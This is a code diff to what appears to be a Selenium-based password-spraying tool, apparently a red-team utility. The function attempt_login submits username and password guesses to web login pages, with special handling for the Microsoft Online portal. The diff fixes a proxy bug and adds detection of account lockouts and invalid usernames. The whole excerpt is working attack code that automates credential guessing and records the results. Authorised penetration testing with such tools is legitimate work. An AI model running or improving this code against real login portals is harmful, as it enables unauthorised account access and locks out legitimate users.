@@ -293,7 +293,7 @@ def attempt_login(spray_config, proxy_url):
     selenium_options = webdriver.ChromeOptions()
     selenium_options.add_argument('--ignore-certificate-errors')
     #selenium_options.add_argument("--headless")
-    if proxy:
+    if proxy_url:
         selenium_options.add_argument(f'--proxy-server={proxy_url}')
     driver = webdriver.Chrome(options=selenium_options)
     driver.delete_all_cookies()
@@ -322,6 +322,8 @@ def attempt_login(spray_config, proxy_url):
     except TimeoutException:
         input_box.send_keys(Keys.RETURN)
         sleep(1)  # Wait for the page to load
+
+        # Specific to the Microsoft Online login portal
         if "Microsoft" and "Work or school account" in driver.page_source:
             work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
             work_box.click()
@@ -330,7 +332,11 @@ def attempt_login(spray_config, proxy_url):
     if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
         driver.close()
-        return
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "INVALID USERNAME"}
+    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
+        driver.close()
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
 
     try:
         WebDriverWait(driver, 3).until(
@@ -339,7 +345,7 @@ def attempt_login(spray_config, proxy_url):
         print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
               f"'{spray_config.password_field_value}'")
         driver.close()
-        return
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
     password_box.clear()
